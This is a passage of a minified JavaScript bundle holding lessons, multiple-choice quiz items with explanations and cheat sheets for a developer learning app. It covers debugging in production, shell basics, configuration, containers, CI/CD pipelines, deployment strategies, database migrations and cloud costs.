MB"],answer:1,why:"A saw-tooth with a stable bottom is normal: objects are created, then collected. A leak shows a bottom that keeps rising."}]},{id:"debugging.production",title:"Debugging in production",summary:'No debugger, real users — and "works on my machine".',minutes:5,blocks:[{type:"text",text:"In production you usually **cannot** attach a debugger or set breakpoints. Pausing a real server stops real users. So the evidence must already be there: logs, metrics, traces, error reports."},{type:"list",items:["Search logs by correlation id or user id.","Check metrics: when did it start? Which servers?","Look at recent changes: deploys, config, feature flags, data imports.","Reproduce in a test environment with similar data (careful with private data).","If logs are missing, add **targeted** logs around the suspect code and deploy."]},{type:"text",text:`A **feature flag** is a switch that turns code on or off without a deploy. New feature breaks? Turn the flag off, users are safe, and now you can investigate calmly.
**Stop the damage first. Find the root cause (the real reason) second.**`},{type:"text",text:'**"Works on my machine"** means one thing: something is **different**. Find the difference.'},{type:"diagram",text:`Your laptop            Production
Debug build            Release build
appsettings.Dev.json   env variables, secrets
Windows                Linux container
Time zone UTC+7        Time zone UTC
50 test rows           50 million real rows
Admin user             Normal user permissions
1 user                 2 000 users at once`},{type:"example",title:"File not found, only in prod",text:"The code loads `Templates/Invoice.html`. The file is named `templates/invoice.html`. On Windows the file system ignores case, so it works. In the Linux container it does not."}],remember:"In prod: stop the damage first, then find what is different. Evidence is better than breakpoints.",questions:[{id:"debugging.production.1",kind:"debug",difficulty:"medium",prompt:'A report "Orders created today" shows wrong orders around midnight for users in Vietnam (UTC+7). It works on the developer\'s laptop in Hanoi. The code uses `DateTime.Now`. Most likely cause?',choices:["The database is corrupted for rows that were saved near midnight","The report caches its results for 24 hours and shows old data","Vietnamese users use a different calendar on their phones",'The server runs in UTC, so its "today" starts 7 hours later'],answer:3,why:'`DateTime.Now` uses the time zone of the machine. The laptop is in UTC+7, the server in UTC, so "today" means different hours. Store times in UTC and convert to the user\'s time zone on purpose.',remember:"Time bugs that only happen in prod → check time zones."},{id:"debugging.production.2",kind:"scenario",difficulty:"easy",prompt:"A new recommendations feature is behind a feature flag. Since it was turned on, the product page throws errors for 20% of users. What do you do first?",choices:["Attach a debugger to the production server","Turn the flag off, then investigate with the logs","Restore yesterday's database backup","Ask users to clear their browser cache"],answer:1,why:"The flag stops the damage in seconds without a deploy. Then you can find the cause calmly, with the logs from the failing requests.",remember:"Stop the damage first, find the root cause second."},{id:"debugging.production.3",kind:"debug",difficulty:"easy",prompt:"Image loading works on your Windows machine. In the Linux Docker container it fails: `File not found: Assets/Logo.png`. The file on disk is `assets/logo.png`. Cause?",choices:["Linux file paths are case-sensitive, Windows paths are not","The container user has no read permission for the assets folder","The image file is too big for the container's memory limit","Linux needs backslashes in file paths, so the path is not found"],answer:0,why:"On Linux `Assets/Logo.png` and `assets/logo.png` are two different paths. Windows treats them as the same, which hides the bug locally."},{id:"debugging.production.4",kind:"scenario",difficulty:"hard",prompt:"A bug happens only in production. You cannot reproduce it locally, and the current logs show nothing useful. What is the best next move?",choices:["Guess the cause and ship a fix to see if it helps","Attach a debugger with breakpoints to a live server","Wait and hope the bug disappears on its own","Add targeted logs around the suspect code, then deploy"],answer:3,why:"If the evidence is missing, create it. Log the inputs, ids and which branch the code took. The next time it happens you have facts instead of guesses."}]}],cheatSheet:[{title:"The method",items:[{term:"Reproduce",meaning:"Make it fail on purpose — or find the exact failing request"},{term:"What changed?",meaning:"Deploy, config, data, traffic — at the time it started"},{term:"Hypothesis",meaning:'Specific and testable: "X fails because Y"'},{term:"One change at a time",meaning:"Otherwise you do not know what fixed it"},{term:"Verify",meaning:"Bug gone AND nothing else broken"},{term:"Stop the damage first",meaning:"Turn the flag off or roll back, then find the root cause"}]},{title:"Reading errors and logs",items:[{term:"Top frame",meaning:"Where the exception was thrown"},{term:"First frame in your code",meaning:"Usually where to start looking"},{term:"Inner exception",meaning:"Often the real cause — read the whole chain"},{term:"throw; vs throw ex;",meaning:"`throw;` keeps the stack trace, `throw ex;` resets it"},{term:"catch { }",meaning:"Exception caught and ignored — invisible bug"},{term:"Structured log",meaning:"Values stored as fields: filter, count, graph"},{term:"Correlation id",meaning:"One id per request, on every log line, in every service"}]},{title:"Metrics",items:[{term:"p50",meaning:"Median: the typical request"},{term:"p95 / p99",meaning:"The slow tail — where users suffer"},{term:"Average",meaning:"Hides a few very slow requests"},{term:"Golden signals",meaning:"The 4 main things to watch: traffic, errors, latency, saturation"}]},{title:"Symptom → first suspect",items:[{term:"High CPU",meaning:"Some code uses a lot of CPU: profile it"},{term:"Low CPU + slow",meaning:"Waiting on IO: DB, HTTP, locks"},{term:"Low CPU + threads growing",meaning:"Thread pool starvation: `.Result` / `.Wait()`"},{term:"Memory low point rising",meaning:"Leak: static list, cache with no limit, event handler"},{term:"Connection pool timeout",meaning:"Slow queries, or connections that are never disposed"},{term:"Works on my machine",meaning:"Config, OS, time zone, data size, permissions differ"}]}]},V=Object.freeze(Object.defineProperty({__proto__:null,default:C},Symbol.toStringTag,{value:"Module"})),P={id:"devops",title:"DevOps & Cloud",emoji:"🚀",tagline:"Build, ship, run — from your laptop to production",lessons:[{id:"devops.command-line",title:"Command line essentials",summary:"Paths, pipes, exit codes and the commands you use every day.",minutes:4,blocks:[{type:"text",text:"The **shell** (terminal, command line) is a program that runs the commands you type. Servers often have no screen, so you work there through the shell."},{type:"diagram",text:`/                    ← root
└── home
    └── ana          ← you are here
        ├── app
        │   └── config.json
        └── logs
            └── api.log

Absolute: /home/ana/logs/api.log
Relative: logs/api.log
          app/config.json`},{type:"text",text:"An **absolute path** starts at the root `/`. It points to the same file from any folder. A **relative path** starts from the **working directory**, the folder you are in now. `..` means one folder up."},{type:"diagram",text:`cat api.log | grep ERROR | wc -l
    │             │          │
 all lines → error lines → count (42)

cmd >  out.txt   write output to a file
cmd >> out.txt   add output to the end
cmd 2> err.txt   write errors to a file`},{type:"text",text:"A **pipe** `|` sends the output of one command into the next one. A **redirect** `>` sends output to a file instead of the screen. Careful: `>` replaces the whole file."},{type:"code",code:{lang:"bash",text:`grep -q "ERROR" api.log
echo $?     # 0 = found, 1 = not found

# deploy.sh: stop at the first failure
set -euo pipefail
# -e: stop when a command fails
# -u: stop on an unset variable
# -o pipefail: a pipe fails if any part fails
dotnet test
dotnet publish -c Release -o out`}},{type:"text",text:"Every command ends with an **exit code**. `0` means success. Any other number means failure. CI tools read the exit code to decide if a step passed.\nBy default, a bash script keeps going after a failed command. `set -e` makes it stop."},{type:"list",items:["`pwd` shows where you are. `ls` lists files. `cd app` moves into a folder.","`cat file` prints a file. `grep word file` prints only the lines that contain the word.","`tail -f api.log` keeps printing new lines while the app writes them. Press Ctrl+C to stop.","`export LOG_LEVEL=Debug` sets an **environment variable**: a named value that programs started from this shell can read."]},{type:"example",title:"The backup script that kept going",text:"A nightly script has three steps: make a backup, upload it, delete backups older than 7 days. One night the backup step starts to fail. The script has no `set -e`, so it keeps going. A week later, every old backup is deleted and no new one exists."}],remember:"Exit code 0 = success. A script must stop at the first failure.",questions:[{id:"devops.command-line.1",kind:"code",difficulty:"medium",prompt:"The tests fail in this CI script. What happens next?",code:{lang:"bash",text:`#!/bin/bash
dotnet test
dotnet publish -c Release -o out
./deploy.sh out`},choices:["The script stops, because dotnet test returned an error","Publish and deploy still run, because the script has no set -e","Bash asks the user whether it should continue or stop","Only the publish runs, then deploy.sh refuses the folder"],answer:1,why:"Without `set -e`, bash runs the next line even when a command fails. The failed tests are ignored, and untested code is deployed. Add `set -euo pipefail` at the top.",remember:"Scripts should stop on the first error."},{id:"devops.command-line.2",kind:"truefalse",difficulty:"easy",prompt:"A command that ends with exit code `0` has failed.",choices:["True","False"],answer:1,why:"Exit code `0` means success. Any other number means some kind of failure. Each tool documents what its own codes mean."},{id:"devops.command-line.3",kind:"debug",difficulty:"medium",prompt:"A script works when you run it from its own folder. When a scheduler (cron) runs it, it fails with `config.json: No such file`. What is the most likely cause?",choices:["The scheduler starts it in another folder, so the relative path breaks","The file is locked, because the scheduler opens it in a second process","Cron cannot read JSON files, so the config must be moved to YAML","The script needs more memory when it runs as a scheduled job"],answer:0,why:"A relative path is resolved from the working directory. Cron starts the script from another folder, often the home folder. Use an absolute path, or build the path from the script location.",remember:"Relative paths depend on where you start the script."},{id:"devops.command-line.4",kind:"scenario",difficulty:"easy",prompt:"You want to watch new error lines in `api.log` on a server while you reproduce a bug. Which command fits?",choices:["`tail -f api.log | grep ERROR`","`cat api.log > ERROR`","`ls api.log | grep ERROR`","`grep ERROR > api.log`"],answer:0,why:"`tail -f` keeps printing new lines, and the pipe sends them to `grep`, which keeps only errors. `grep ERROR > api.log` is dangerous: `>` empties the log file."}]},{id:"devops.config",title:"Config and environments",summary:"One build, many environments, settings from outside the code.",minutes:4,blocks:[{type:"text",text:"An **environment** is one place where your app runs. Each one has its own servers, database and settings. Most teams have at least these four:"},{type:"diagram",text:`        one build: shop v1.4.2
                   │
   ┌─────────┬─────┴───┬─────────┐
   ▼         ▼         ▼         ▼
  dev      test     staging    prod
 your PC  QA team  like prod  real users

Same build everywhere. Only config changes.`},{type:"text",text:"**Same build, different config.** You build the app once. Each environment gives it its own settings: database address, log level, payment mode (test or live)."},{type:"compare",left:{title:"Config in code ❌",items:["A connection string typed into a class",'`if (env == "prod")` spread across the code',"A new build for every environment"]},right:{title:"Config outside code ✅",items:["Environment variables set on the server","A config file per environment, like `appsettings.Production.json`","Secrets in a vault, never in git"]}},{type:"code",code:{lang:"bash",text:`# Same build. Settings come from outside.
export ASPNETCORE_ENVIRONMENT=Staging
export ConnectionStrings__Main="Server=stg-db;..."
dotnet Shop.Api.dll

# In .NET, __ in a variable name means ":"
# so this overrides ConnectionStrings:Main`}},{type:"text",text:"A **secret** is a password or a key. Keep secrets in a **vault**, a locked store like Azure Key Vault. Never commit them to git. The Security topic has the details."},{type:"text",text:"**Staging** is the last stop before production. Make it as close to production as you can: same build, same kind of database, similar data size."},{type:"example",title:'"Works on my machine"',text:"A feature works on a developer PC but fails in test. The PC has a newer .NET runtime and a setting added by hand months ago. Nobody wrote it down. Fix: keep every setting in config, and make environments alike. Containers help here (next lesson)."}],remember:"Build once. Config comes from the environment, secrets from a vault.",questions:[{id:"devops.config.1",kind:"scenario",difficulty:"medium",prompt:"The pipeline builds the app three times: for test, for staging and for production. A bug appears only in production. What is the main risk of this process?",choices:["Production runs a build that nobody has tested","Three builds use three times more disk space on the server","The staging database gets the production config by mistake","The builds are too slow, so releases happen too rarely"],answer:0,why:"Each build can differ: a package version, a compiler flag, a file. So the tested build is not the one in production. Build once, then change only the config.",remember:"Same build everywhere. Only config changes."},{id:"devops.config.2",kind:"debug",difficulty:"medium",prompt:"After a deploy, the production app saves orders into the staging database. The code did not change. What is the most likely cause?",choices:["Production did not set the connection string, so the file default was used","The staging database copied itself into production during the night","The load balancer sent production traffic to the staging servers","The .NET runtime picks the newest database that it can find"],answer:0,why:"Config that is missing in one environment silently falls back to a default. If that default points to staging, production writes to the wrong place. Fail at startup when a required value is missing."},{id:"devops.config.3",kind:"truefalse",difficulty:"easy",prompt:"To change the log level from Info to Debug in production, you should make a new build.",choices:["True","False"],answer:1,why:"The log level is config, not code. Change the environment variable or config file, and restart the app if needed. The build stays the same."},{id:"devops.config.4",kind:"compare",difficulty:"easy",prompt:"Each environment uses a different payment API address. Where should the address live?",choices:["In a config value set per environment","In a constant in the code, edited before each release"],answer:0,why:"Config per environment lets one build run everywhere. A constant needs a code change and a new build each time, and someone will forget."}]},{id:"devops.containers",title:"Containers",summary:"Images, layers, and why containers forget everything.",minutes:5,blocks:[{type:"text",text:`A **container** packs your app with everything it needs: runtime, libraries, files. It runs the same way on your PC, in CI and in production.
An **image** is the read-only package. A **container** is a running copy of an image. Think class and object: one image, many containers.`},{type:"diagram",text:` image: shop-api:1.4      (like a class)
              │ docker run
   ┌──────────┼──────────┐
   ▼          ▼          ▼
container 1 container 2 container 3
        (like objects)`},{type:"text",text:"A **Dockerfile** is the recipe for an image. This one has two stages. It builds with the full SDK, then copies the result into a small runtime image."},{type:"code",code:{lang:"dockerfile",text:`# Stage 1: build with the full SDK
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
COPY Shop.Api.csproj .
RUN dotnet restore
COPY . .
RUN dotnet publish -c Release -o /out

# Stage 2: small image that only runs the app
FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /out .
ENTRYPOINT ["dotnet", "Shop.Api.dll"]`}},{type:"text",text:"Each `RUN` or `COPY` step adds a **layer**. Docker caches layers. If a step and every step before it did not change, Docker reuses the cached layer. So put steps that rarely change first."},{type:"diagram",text:` Layers (built bottom to top)
 ┌────────────────────────┐
 │ COPY . .  (your code)  │ ← changes often
 ├────────────────────────┤
 │ RUN dotnet restore     │ ← rarely
 ├────────────────────────┤
 │ COPY Shop.Api.csproj   │ ← rarely
 ├────────────────────────┤
 │ FROM sdk (base image)  │ ← almost never
 └────────────────────────┘
 A change rebuilds that layer
 and every layer above it.`},{type:"diagram",text:` Virtual machines       Containers
┌────────┬────────┐   ┌─────┬─────┬─────┐
│ App A  │ App B  │   │App A│App B│App C│
│ Guest  │ Guest  │   ├─────┴─────┴─────┤
│ OS     │ OS     │   │ Container engine│
├────────┴────────┤   ├─────────────────┤
│ Hypervisor      │   │ Host OS (kernel)│
├─────────────────┤   ├─────────────────┤
│ Server          │   │ Server          │
└─────────────────┘   └─────────────────┘
 each has a full OS    all share 1 kernel`},{type:"text",text:`A **virtual machine** (VM) runs a full guest operating system. It sits on a **hypervisor**, the software that splits one server into many VMs. Containers share the host **kernel**, the core of the operating system. So containers are smaller and start faster.
Containers are **disposable**. A deploy throws the old ones away and starts new ones. Keep data outside: a database, blob storage, or a **volume** (storage that lives outside the container).`},{type:"example",title:"The lost photos",text:"A shop app saves product photos to `/app/uploads` inside the container. On Monday the team deploys a new version. New containers start, and all photos from last week are gone."}],remember:"Image = class, container = object. Containers get thrown away, so keep data outside.",questions:[{id:"devops.containers.1",kind:"mcq",difficulty:"easy",prompt:"How is a container related to an image?",choices:["A container is a running copy of an image","An image is a running copy of a container","They are two names for the same file","An image is a backup taken from a container"],answer:0,why:"The image is the read-only package. A container is one running copy of it. Like a class and its objects, one image can start many containers."},{id:"devops.containers.2",kind:"perf",difficulty:"medium",prompt:"With this Dockerfile, every one-line code change makes the build download all packages (NuGet) again. Why?",code:{lang:"dockerfile",text:`FROM mcr.microsoft.com/dotnet/sdk:8.0
WORKDIR /src
COPY . .
RUN dotnet restore
RUN dotnet publish -c Release -o /out`},choices:["`COPY . .` comes before restore, so any change breaks the cache for restore","Docker never caches `RUN` steps, so every step runs again each time","The base image is downloaded again for every build","`dotnet restore` always ignores the NuGet cache in a container"],answer:0,why:"A changed layer rebuilds itself and every layer after it. Copy only the project file, run restore, then copy the rest. Now restore stays cached until the packages change.",remember:"Rarely changing steps first, often changing steps last."},{id:"devops.containers.3",kind:"debug",difficulty:"medium",prompt:"Users upload photos. After every deploy, all older photos are gone. The app saves them to `/app/uploads`. What is the cause?",choices:["The deploy starts new containers, and files inside the old ones are lost","The photos were too big, so the server deleted them to free space","The browser cache was cleared, so the old photo links stopped working","The database rolled back the photo rows during the deploy"],answer:0,why:"The file system of a container is thrown away with the container. Keep files in blob storage, a database or a volume, which live outside the container.",remember:"Never keep important data inside a container."},{id:"devops.containers.4",kind:"truefalse",difficulty:"medium",prompt:"Like a virtual machine, each container runs its own full operating system kernel.",choices:["True","False"],answer:1,why:"Containers share the kernel of the host. That is why they are small and start fast. A virtual machine runs a full guest OS on a hypervisor."}]},{id:"devops.ci-cd",title:"CI/CD pipelines",summary:"From git push to production, automatically.",minutes:4,blocks:[{type:"text",text:"**CI** (continuous integration) means everyone merges small changes often. Every push is built and tested automatically. Problems show up in minutes, not on release day."},{type:"diagram",text:`git push
   │
   ▼
┌───────┐   ┌──────┐   ┌─────────┐
│ build │──►│ test │──►│ package │
└───────┘   └──────┘   └────┬────┘
                            │ shop:1.4.2
                            ▼
              test ──► staging ──► prod
              (same artifact every time)

Any step fails → the pipeline stops.`},{type:"text",text:"A **pipeline** is the list of automatic steps after a push. An **artifact** is what the build produces: a zip, a package or a container image. Build the artifact **once**. Then **promote** it: deploy that same artifact to test, then staging, then production."},{type:"code",code:{lang:"yaml",text:`# .github/workflows/ci.yml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: '8.0.x' }
      - run: dotnet build -c Release
      - run: dotnet test -c Release --no-build
      - run: docker build -t shop:$GITHUB_SHA .`}},{type:"text",text:"Each `run` line is a shell command. If it returns a non-zero exit code, the pipeline stops there and turns **red** (failed). A passing pipeline is **green**."},{type:"compare",left:{title:"Rebuild per environment ❌",items:["Test, staging and prod get different builds","A package update can sneak in between builds","What you tested is not what you ship"]},right:{title:"Build once, promote ✅",items:["One artifact, tagged with a version","The same artifact moves test → staging → prod","Only the config changes per environment"]}},{type:"text",text:"**Fail fast.** Put quick checks first: compile, then unit tests, then slow tests. A pipeline that fails in 2 minutes saves more time than one that fails after 40. A red pipeline is fixed before new work starts."},{type:"list",items:["**Continuous integration** — every push is built and tested automatically.",'**Continuous delivery** — every green build is ready to release. A person clicks "deploy to production".',"**Continuous deployment** — every green build goes to production automatically. No human step."]},{type:"example",title:"The Friday rebuild",text:"A team tests a build in staging all week. On Friday they build again for production. The project allows any 2.x version of a library, and 2.9 came out on Thursday. Production now runs code that nobody tested, and it breaks."}],remember:"Build once, fail fast, promote the same artifact to every environment.",questions:[{id:"devops.ci-cd.1",kind:"mcq",difficulty:"medium",prompt:"Every build that passes all checks goes to production with no human approval. What is this called?",choices:["Continuous integration","Continuous delivery","Continuous deployment","A nightly build"],answer:2,why:"Continuous deployment releases every passing build automatically. Continuous delivery keeps every build ready, but a person decides when to release."},{id:"devops.ci-cd.2",kind:"scenario",difficulty:"medium",prompt:"Staging tested the image `shop:1.4.2` for two days. For production, the pipeline runs `docker build` again from the same commit. What is the risk?",choices:["Production may get packages or a base image that staging never tested","Docker refuses to build the same commit twice, so the deploy fails","The new image gets the same tag, so staging is replaced as well","There is no risk, because the same commit always gives the same image"],answer:0,why:"A rebuild can pull a newer base image or package version. Then production runs something that was never tested. Promote the exact image that passed staging.",remember:"Build once, promote the same artifact."},{id:"devops.ci-cd.3",kind:"compare",difficulty:"medium",prompt:"A pipeline runs 30 minutes of browser tests first, then compile and unit tests. A typo fails the build after 31 minutes. Which order is better?",choices:["Compile and unit tests first, slow browser tests last","Keep slow tests first, because they find the most bugs","Run only browser tests, because they cover everything"],answer:0,why:"Fail fast: cheap checks catch simple errors in a minute or two. Slow tests run only when the quick ones pass.",remember:"Quick checks first."},{id:"devops.ci-cd.4",kind:"code",difficulty:"hard",prompt:"The pipeline is always green, but broken code keeps reaching production. Look at the test step. What is wrong?",code:{lang:"bash",text:`dotnet build -c Release
dotnet test -c Release --no-build || true
./deploy.sh`},choices:["`|| true` turns every test failure into exit code 0","`--no-build` skips the tests, so nothing is checked","`deploy.sh` runs before `dotnet test` has finished","`-c Release` turns off the asserts inside the tests"],answer:0,why:"`a || true` means: if `a` fails, run `true`, which always succeeds. The step always exits with 0, so the pipeline never sees the failure. `--no-build` only skips building again."}]},{id:"devops.deploy-strategies",title:"Deployment strategies",summary:"Recreate, rolling, blue-green, canary and feature flags.",minutes:5,blocks:[{type:"text",text:"A deploy replaces version 1 (v1) with version 2 (v2). The **strategy** decides how users move from v1 to v2. It also decides how fast you can go back."},{type:"diagram",text:`Recreate: stop all, then start all
 v1 v1 v1 → -- -- -- → v2 v2 v2
            downtime

Rolling: replace one server at a time
 v1 v1 v1 → v2 v1 v1 → v2 v2 v1 → v2 v2 v2`},{type:"diagram",text:`Blue-green: two full copies, one is live
 before:  router ──► blue  (v1)
                     green (v2) tested
 after:   router ──► green (v2)
                     blue  (v1) waits
 Problem? Switch the router back.

Canary: a small group goes first
 users ──┬─ 95% ─► v1
         └─  5% ─► v2   watch errors
 OK? → 25% → 50% → 100%`},{type:"list",items:["**Recreate** — simple, but users see downtime. Fine for an internal tool at night.","**Rolling** — no downtime. For a while, v1 and v2 both run behind the **load balancer**. That is the part that spreads requests across servers.","**Blue-green** — instant switch, and instant switch back. You pay for two full environments for a while.","**Canary** — a bad version hurts only a few users. You need good error metrics to judge it."]},{type:"text",text:"A **feature flag** is an on/off setting that the code checks while it runs. You deploy the code with the flag off. You turn it on later, for some users or for all. Deploy and release become two separate steps."},{type:"code",code:{lang:"ts",text:`if (flags.isOn('new-checkout', user)) {
  return newCheckout(cart);
}
return oldCheckout(cart);`}},{type:"text",text:"Always have a **rollback plan**: how to go back to the last good version, and how long it takes. Write it down before the deploy, not during the incident."},{type:"example",title:"A canary that paid off",text:"A bank app sends 5% of users to v2. Login errors rise from 0.1% to 3%. The team sends everyone back to v1 within a minute. Only those 5% of users saw the problem."}],remember:"Before every deploy, know how to roll back and how long it takes.",questions:[{id:"devops.deploy-strategies.1",kind:"scenario",difficulty:"easy",prompt:"An internal report tool is used only in office hours. You deploy at 22:00, when nobody uses it. Which strategy is enough?",choices:["Recreate: stop the old version, start the new one","Canary: 5% of traffic first, with error dashboards","Blue-green: two full environments and a router","Rolling: replace servers one by one under load"],answer:0,why:"Nobody uses the tool at night, so a short downtime hurts no one. Recreate is the simplest. The other strategies add cost that brings no value here."},{id:"devops.deploy-strategies.2",kind:"compare",difficulty:"medium",prompt:"You change the payment page, and the change is risky. You want a small group of real users to try it first while you watch errors. Which strategy fits?",choices:["Canary release","Recreate deploy","Blue-green switch","Rolling deploy"],answer:0,why:"A canary sends a small share of traffic to the new version. If errors rise, only those users are affected, and you move them back. Blue-green switches everyone at once.",remember:"Canary = a few users first, then more."},{id:"devops.deploy-strategies.3",kind:"debug",difficulty:"hard",prompt:"During a deploy, a user refreshes the page a few times. The layout goes new, old, then new again. What explains this?",choices:["A rolling deploy: v1 and v2 servers run at once behind the load balancer","The browser cache keeps two copies of the page and picks one at random","The database returned old rows, because the migration ran too late","The CDN is down, so the page is built twice for each request"],answer:0,why:"In a rolling deploy, old and new servers serve traffic together for a while. Each request can land on either one. Code and data must work with both versions during that time.",remember:"Rolling = two versions live at the same time."},{id:"devops.deploy-strategies.4",kind:"mcq",difficulty:"medium",prompt:"What does a feature flag let you do?",choices:["Turn a feature on or off without a new deploy","Deploy a feature without running any tests","Ship code to production without a code review","Run two databases for the same feature"],answer:0,why:"The code ships with the flag off. You turn it on later, for some users or for everyone. If it goes wrong, you turn it off in seconds."}]},{id:"devops.db-changes",title:"Database changes during deployment",summary:"Old and new code share one database. Change it in safe steps.",minutes:5,blocks:[{type:"text",text:"A **migration** is a script that changes the database **schema**, that is, its tables and columns. During a rolling deploy, old and new code run at the same time. Both use the **same database**."},{type:"diagram",text:` Rolling deploy, minute 3:

 v1 server ──┐
 v1 server ──┼──► one database
 v2 server ──┘    (one schema)

 Both versions must work with
 the schema at the same time.`},{type:"example",title:"The rename that broke checkout",text:"A migration renames `Phone` to `PhoneNumber`. The v2 servers work fine. The v1 servers are still running, and they still query `Phone`. For ten minutes, half of the orders fail."},{type:"text",text:"The safe pattern is **expand / contract**. First **expand**: add the new thing next to the old one. Later **contract**: remove the old thing when no running code uses it. A rollback also stays safe, because v1 still finds its column."},{type:"diagram",text:`Step 1  expand    add PhoneNumber (null)
Step 2  write     code writes both columns
Step 3  backfill  copy old Phone values
Step 4  switch    code reads PhoneNumber
Step 5  contract  drop Phone (later release)

Each step is safe on its own.`},{type:"code",code:{lang:"sql",text:`-- Step 1 (expand): old code ignores it
ALTER TABLE Customers
  ADD PhoneNumber nvarchar(20) NULL;

-- Step 3 (backfill): small batches.
-- Repeat until no rows change.
UPDATE TOP (5000) Customers
SET PhoneNumber = Phone
WHERE PhoneNumber IS NULL AND Phone IS NOT NULL;`}},{type:"list",items:["Never rename or drop a column in one step. Running code still uses it.","A new required column breaks old code that inserts rows without it. Make it nullable or give it a default.","Update big tables in small batches. One huge update can block the table for minutes.","Drop the old column only after every server runs the new code."]}],remember:"Old and new code share one database: add first, switch, remove last.",questions:[{id:"devops.db-changes.1",kind:"debug",difficulty:"medium",prompt:"A migration renames `Phone` to `PhoneNumber`. During the rolling deploy, half the requests fail with `Invalid column name Phone`. Why?",choices:["Old v1 servers still run, and they query the old column name","The new code has a typo in the column name of the query","SQL Server needs a restart before a rename takes effect","The index on `Phone` was dropped, so queries cannot find rows"],answer:0,why:"The database changed for everyone at once, but v1 servers were still running. They still ask for `Phone`. Add the new column first, and drop the old one later."},{id:"devops.db-changes.2",kind:"scenario",difficulty:"medium",prompt:"You must rename `Email` to `LoginEmail` with no downtime. What is the first step?",choices:["Add a nullable `LoginEmail` column and keep `Email` for now","Rename the column in one migration, then deploy the code fast","Drop `Email` and create `LoginEmail` in one transaction","Stop all servers, rename the column, then start them again"],answer:0,why:"Expand first: add the new column next to the old one, so old code keeps working. Then copy the data and switch the code. Drop `Email` in a later release.",remember:"Expand, migrate, contract."},{id:"devops.db-changes.3",kind:"truefalse",difficulty:"medium",prompt:"With expand and contract, you can drop the old column in the same deploy that stops reading it.",choices:["True","False"],answer:1,why:"While that deploy rolls out, old servers still read the column. A rollback would also need it. Drop it in a later release, when no running code uses it."},{id:"devops.db-changes.4",kind:"perf",difficulty:"hard",prompt:"At noon, you backfill a new column with one statement: `UPDATE Customers SET PhoneNumber = Phone`. The table has 40 million rows. What is the main risk?",choices:["One huge transaction holds locks for minutes and blocks the app","The UPDATE skips rows when the table has more than 10 million","The new column becomes NOT NULL after the first update","The app servers run out of memory while the update runs"],answer:0,why:"One huge update locks many rows and grows the transaction log a lot. Users wait or get timeouts. Update in small batches, like 5,000 rows at a time.",remember:"Backfill in small batches."}]},{id:"devops.cloud",title:"Cloud basics",summary:"IaaS, PaaS, serverless, regions, and where the bill surprises you.",minutes:5,blocks:[{type:"text",text:"**The cloud** means renting servers and services from a provider, like AWS, Azure or Google Cloud. You do not buy hardware. You pay for what you use."},{type:"text",text:"Think of pizza. **Home-made**: you do everything (your own servers, called on-premises). **Take and bake**: the shop makes it, you bake it (IaaS). **Delivery**: you only set the table (PaaS). **Restaurant**: you just eat (SaaS)."},{type:"diagram",text:`            You manage        Example
──────────  ────────────────  ─────────────
On-prem     everything        own servers
IaaS        OS, runtime, app  Azure VM, EC2
PaaS        app + config      App Service
Serverless  function code     AWS Lambda
SaaS        your settings     Gmail, Jira`},{type:"text",text:"A **VM** (virtual machine) is a rented computer that you patch yourself. **Serverless** still uses servers, but you never see them. Your code runs when an event comes, like an HTTP call or a queue message. You pay per run. The first call after a quiet time can be slow (a **cold start**)."},{type:"diagram",text:`Region: Southeast Asia (Singapore)
┌──────────────────────────────────┐
│  Zone A      Zone B      Zone C  │
│ ┌──────┐    ┌──────┐    ┌──────┐ │
│ │ app  │    │ app  │    │ app  │ │
│ └──────┘    └──────┘    └──────┘ │
└──────────────────────────────────┘
 Zone C loses power → A and B go on`},{type:"text",text:"A **region** is a geographic area. A **zone** (availability zone) is one or more data centers in that region, with its own power and network. Spread servers across zones, so one power cut does not stop you. Pick a region near your users, and check where the law lets your data live."},{type:"text",text:"**Autoscaling** adds servers when load is high and removes them when it is low. You pay for the time servers run, so fewer idle servers cost less. Always set a maximum. The Architecture topic explains how to make an app scale."},{type:"list",items:["**Egress** — data leaving the cloud to the internet is usually charged per GB. Data coming in is often free.","**Idle resources** — a test VM or database left running all weekend still costs money.","**Forgotten extras** — old disks and snapshots (disk copies) keep costing after the VM is deleted.","**No maximum** — with autoscaling and no limit, a bug or an attack can start 100 servers."]},{type:"example",title:"The weekend bill",text:"A team starts a large GPU machine for a Friday demo. Nobody stops it. On Monday the bill shows 60 hours of the most expensive machine. Fixes: budget alerts, an owner tag on every resource, and auto-shutdown for test machines."}],remember:"You pay for what runs and for data that leaves. Stop what you do not use.",questions:[{id:"devops.cloud.1",kind:"mcq",difficulty:"easy",prompt:"You push code to a platform. It runs the servers, OS updates and runtime. You manage only the app and its config. Which model is this?",choices:["PaaS","IaaS","SaaS","On-premises"],answer:0,why:"PaaS (platform as a service) runs the platform for you. With IaaS you get a VM and patch the OS yourself. SaaS is a finished app, like email."},{id:"devops.cloud.2",kind:"scenario",difficulty:"medium",prompt:"Your app runs on two VMs in the same zone. A power failure in that data center takes the app down. What is the usual fix?",choices:["Spread the VMs across two or more zones in the region","Move both VMs to a bigger machine in the same zone","Add a third VM next to the other two in that zone","Take a daily backup of both VMs to the same disk"],answer:0,why:"Zones have separate power, cooling and network. If one zone fails, servers in the other zones keep running. More servers in one zone still fail together.",remember:"One zone = one point of failure."},{id:"devops.cloud.3",kind:"debug",difficulty:"medium",prompt:"The cloud bill doubled this month. The number of servers did not change. A new feature lets users download large video reports from cloud storage. What is the likely cause?",choices:["Egress: data sent out to the internet is charged per GB","Storage reads are slower, so the servers run for longer","The videos are stored twice, which doubles the price of the VMs","Autoscaling added servers that the dashboard does not show"],answer:0,why:"Clouds usually charge for data that leaves to the internet. Large downloads add up fast. Check egress in the bill, and shrink or cache large files."},{id:"devops.cloud.4",kind:"compare",difficulty:"medium",prompt:"A job runs for 2 minutes once an hour. Which option usually costs less?",choices:["A serverless function that runs only when the job starts","A VM that runs all day and waits for the job"],answer:0,why:"The function is billed for about 48 minutes a day. The VM is billed for all 24 hours, and it is idle most of that time.",remember:"Rare, short jobs fit serverless."}]}],cheatSheet:[{title:"Command line",items:[{term:"Absolute path",meaning:"Starts at the root `/`; same file from any folder"},{term:"Relative path",meaning:"Starts from the current folder; `..` = one folder up"},{term:"`a | b`",meaning:"Pipe: the output of a becomes the input of b"},{term:"`>` and `>>`",meaning:"Send output to a file: replace it, or add to the end"},{term:"Exit code",meaning:"`0` = success, any other number = failure"},{term:"`set -euo 